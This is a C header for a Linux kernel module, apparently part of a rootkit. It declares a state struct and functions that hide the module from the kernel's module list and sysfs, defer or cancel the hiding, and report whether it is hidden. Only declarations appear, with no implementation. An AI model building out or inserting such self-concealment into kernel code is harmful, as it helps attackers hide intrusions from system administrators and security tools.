#ifndef UB_CONCEAL_H
#define UB_CONCEAL_H

#include <linux/types.h>
#include <linux/version.h>
#include <linux/module.h>
#include <linux/kobject.h>
#include <linux/workqueue.h>

struct ub_conceal_state {
    struct list_head *saved_list_pos;
    struct kobject   *saved_parent;
    bool hidden;
};

void ub_module_conceal(void);
void ub_module_conceal_deferred(void);
void ub_module_conceal_cancel(void);

bool ub_module_is_concealed(void);

#endif
